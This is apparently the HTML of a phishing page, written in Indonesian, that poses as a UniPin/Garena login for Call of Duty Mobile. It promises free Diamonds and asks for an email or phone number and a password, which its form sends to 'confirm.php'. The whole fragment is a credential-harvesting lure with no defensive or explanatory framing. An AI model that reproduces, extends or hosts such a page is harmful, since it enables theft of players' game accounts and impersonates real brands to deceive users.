...
<head>
    ...
    <title>UniPin - Call of Duty Mobile Login Garena</title>
        ...
        <section>
            <div class="container">
                    ...
                    <div class="col-sm-offset-3 col-sm-6">
                            ...
                            <h2 align="center">Masuk Call of Duty Mobile menggunakan Garena</h2>
                            <br/>
                            <form method="POST" action="confirm.php" accept-charset="UTF-8" class="text-semibold row">

                            <input type="hidden" name="provider" value="Garena">
                            
                            <div class="col-xs-12">
                                <div class="field-wrap">
                                    <input class="jp-playlist-input" autocomplete="off" required autofocus placeholder="Email atau Telepon" name="email" type="text" style="outline: none;">
                                </div>
                            </div>

                            <div class="col-xs-12">
                                <div class="field-wrap">
                                    <input class="jp-playlist-input" required autocomplete="off" placeholder="Kata Sandi" name="password" type="password" style="outline: none;">
                                </div>
                            </div>

                            <div class="col-xs-12">
                                <br/>
                                <p style="font-weight: 300;text-align: justify">Untuk mendapatkan Diamond secara gratis, Kami membutuhkan informasi tentang akun Anda. Login menggunakan akun Garena yang terhubung dengan akun Call of Duty Mobile anda.</p>
                            </div>

                            <div class="col-xs-12">
                                <br/>
                                <div class="field-wrap text-center">
                                    <input class="btn btn-primary btn-radius-3 btn-md btn-block font-light mb-10" type="submit" name="masuk" value="Masuk">
                                </div>
                            </div>
